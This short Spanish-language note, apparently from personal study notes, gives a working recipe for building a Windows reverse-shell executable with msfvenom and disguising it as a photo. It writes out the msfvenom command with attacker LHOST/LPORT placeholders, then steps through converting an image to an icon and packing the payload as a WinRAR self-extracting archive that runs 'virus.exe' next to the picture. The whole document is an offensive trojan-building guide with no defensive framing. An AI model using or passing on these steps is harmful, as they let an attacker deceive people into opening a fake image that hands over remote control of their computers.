Vamos a utilizar [[msfvenom]], para crearnos un payload que esté hecho para Windows:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=myIP LPORT=port -f exe -o trampita.exe`

Para meterlo dentro de una foto:

1. Nos hace falta tener el archivo en formato ".ico":

"Convert ico" y descargamos el nuevo icono.

2. Usamos winrar:

Abrimos Winrar.
Añadir al archivo.

	1. Crear un archivo autoextraíble.
	2. Método de compresión: la mejor.

Avanzado -> Autoextraíble -> Instalación.

	Ejecutar tras la instalación (virus.exe, foto.png)

Texto e icono -> Cargar icono desde fichero -> Examinar.

	Seleccionamos la foto que está en formato ico.


	